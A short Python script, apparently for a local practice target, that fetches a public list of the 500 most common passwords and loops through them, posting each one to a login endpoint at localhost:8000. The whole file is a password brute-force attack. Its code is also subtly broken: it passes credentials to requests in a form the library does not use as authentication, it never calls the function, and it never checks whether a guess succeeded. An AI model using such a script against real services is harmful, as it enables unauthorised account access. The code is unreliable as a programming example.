import requests

url = "http://localhost:8000/"

passwords = requests.get(
    'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt').text


def brute_force():
    for password in passwords.split():
        requests.post(url, auth={'password': password})
